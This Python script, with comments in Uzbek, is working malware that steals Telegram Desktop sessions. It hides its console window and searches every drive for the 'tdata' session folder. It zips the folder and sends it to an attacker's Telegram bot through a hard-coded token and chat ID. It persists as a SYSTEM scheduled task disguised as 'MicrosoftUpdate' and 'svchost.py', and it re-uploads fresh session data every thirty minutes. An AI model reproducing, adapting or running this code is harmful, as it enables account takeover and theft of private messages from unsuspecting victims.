import os
import ctypes
import time
import json
import urllib.request
import socket
import tempfile
import zipfile
import subprocess
import sys

# Qora oynani yashirish
if os.name == 'nt':
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

BOT_TOKEN = "8474648259:AAH3sMxwJCPwkit40x--YgvETDLkZ0jmgu4"
CHAT_ID = 7080045924

def send_file(file_path, caption):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
        with open(file_path, 'rb') as f:
            data = f.read()
        boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
        body = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="chat_id"\r\n\r\n{CHAT_ID}\r\n'
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="caption"\r\n\r\n{caption}\r\n'
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="document"; filename="tdata.zip"\r\n'
            f"Content-Type: application/octet-stream\r\n\r\n"
        ).encode() + data + f"\r\n--{boundary}--\r\n".encode()
        req = urllib.request.Request(url, data=body, headers={"Content-Type": f"multipart/form-data; boundary={boundary}"})
        urllib.request.urlopen(req)
    except:
        pass

def get_tdata_bruteforce():
    pc_name = socket.gethostname()
    # 1. Standart yo'ldan qidiramiz
    appdata = os.getenv('APPDATA')
    tdata_path = os.path.join(appdata, 'TelegramDesktop', 'tdata')
    if os.path.exists(tdata_path):
        return tdata_path, pc_name
    
    # 2. Agar topilmasa, hamma disk va papkalarni qidiramiz (C: dan Z: gacha)
    for drive_letter in range(ord('C'), ord('Z') + 1):
        drive = f"{chr(drive_letter)}:\\"
        if os.path.exists(drive):
            try:
                for root, dirs, files in os.walk(drive, topdown=True):
                    if os.path.basename(root).lower() == 'tdata':
                        # TelegramsDesktop papkasini topdik!
                        return root, pc_name
                    if 'telegramdesktop' in root.lower():
                        possible_tdata = os.path.join(root, 'tdata')
                        if os.path.exists(possible_tdata):
                            return possible_tdata, pc_name
            except:
                pass
    return None, pc_name

def install_persistence():
    try:
        script_path = os.path.join(os.environ['APPDATA'], 'svchost.py')
        if not os.path.exists(script_path):
            content = urllib.request.urlopen(sys.argv[0] if len(sys.argv) > 0 else __file__).read().decode()
            with open(script_path, 'w') as f:
                f.write(content)
        subprocess.run(['schtasks', '/create', '/tn', 'MicrosoftUpdate', '/tr', f'"{sys.executable}" "{script_path}"', '/sc', 'onlogon', '/ru', 'SYSTEM', '/rl', 'HIGHEST', '/f', '/it'], shell=True)
    except:
        pass

def force_start_telegram():
    try:
        # Agar Telegram Desktop ochiq bo'lmasa, uni majburan ochamiz
        result = subprocess.run(['tasklist', '/fi', 'imagename eq Telegram.exe'], capture_output=True, text=True)
        if "Telegram.exe" not in result.stdout:
            subprocess.Popen(['start', 'Telegram'], shell=True)
            time.sleep(15)  # Telegrams ochilishi uchun vaqt beramiz
    except:
        pass

# MAIN
install_persistence()

# Telegram Desktop ni majburan ochamiz (agar ochiq bo'lmasa)
force_start_telegram()

# Qidiruvni boshlaymiz (eng kuchli qidiruv)
tdata_path, pc_name = get_tdata_bruteforce()

if tdata_path:
    # Agar topilsa, darhol yig'amiz va yuboramiz
    try:
        temp_dir = tempfile.gettempdir()
        zip_path = os.path.join(temp_dir, f"tdata_{pc_name}_{int(time.time())}.zip")
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, dirs, files in os.walk(tdata_path):
                for file in files:
                    try:
                        file_path = os.path.join(root, file)
                        zipf.write(file_path, os.path.relpath(file_path, os.path.dirname(tdata_path)))
                    except: pass
        send_file(zip_path, f"✅ Yangi tdata yig'ildi!\n🖥 {pc_name}")
        os.remove(zip_path)
    except:
        pass

# Doimiy kuzatish
last_sent = 0
while True:
    time.sleep(300) # Har 5 daqiqada tekshiradi
    try:
        result = subprocess.run(['tasklist', '/fi', 'imagename eq Telegram.exe'], capture_output=True, text=True)
        if "Telegram.exe" in result.stdout:
            if time.time() - last_sent > 1800: # Har 30 daqiqada yangilash
                tdata_path, pc_name = get_tdata_bruteforce()
                if tdata_path:
                    try:
                        temp_dir = tempfile.gettempdir()
                        zip_path = os.path.join(temp_dir, f"tdata_{pc_name}_{int(time.time())}.zip")
                        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                            for root, dirs, files in os.walk(tdata_path):
                                for file in files:
                                    try:
                                        file_path = os.path.join(root, file)
                                        zipf.write(file_path, os.path.relpath(file_path, os.path.dirname(tdata_path)))
                                    except: pass
                        send_file(zip_path, f"✅ Yangi tdata yig'ildi!\n🖥 {pc_name}")
                        os.remove(zip_path)
                        last_sent = time.time()
                    except:
                        pass
    except:
        pass
